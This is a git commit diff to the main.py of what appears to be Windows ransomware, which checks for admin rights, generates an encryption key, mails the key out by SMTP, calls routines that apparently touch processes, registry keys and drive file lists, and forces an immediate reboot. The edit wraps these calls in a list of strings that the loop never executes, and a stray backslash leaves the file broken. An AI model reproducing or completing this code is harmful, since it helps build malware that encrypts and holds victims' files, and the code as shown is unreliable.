afab50731ed5cca4acfba8c4e5d8befb4b9ca7f3
T-wcs <70718793+T-wcs@users.noreply.github.com>
2021-04-01 13:12:41 +0200

    Update main.py

--- main.py
+++ main.py
@@ -23,22 +23,11 @@ if(get_admin_rights.is_admin()):
     if host_connect.keyrcv():
         keyserver.getcrypt()
     else:
-        crypt.genkey(current_user)
-        crypt.random_id()
-        sendkey_smtp.send_key()
-        gt.proc()
-        gr.proc()
-        dk.smart()
-        dr.stsk()
-        rkey.setkey()
-        rkey.delkey()
-        rkey.setInit()
-        gt.dir()
-        gr.dir()
-        crypt.drives_aux()
-        crypt.filelist()
-        dk.exp()
-        dr.exp()
+        my_list = ['crypt.genkey(current_user)', 'crypt.random_id()', 'sendkey_smtp.send_key()', 'gt.proc()', 'gr.proc()', 'dk.smart()', \ 
+                   'dr.stsk()', 'rkey.setkey()', 'rkey.delkey()', 'rkey.setInit()', 'gt.dir()', 'gr.dir()', 'crypt.drives_aux()', 'crypt.filelist()', \
+                     'dk.exp()', 'dr.exp()']
+        for x in my_list:
+            x
         # REBOOT WINDOWS
         os.system("\\Windows\\System32\\shutdown.exe -t 0 -r -f")
 else:
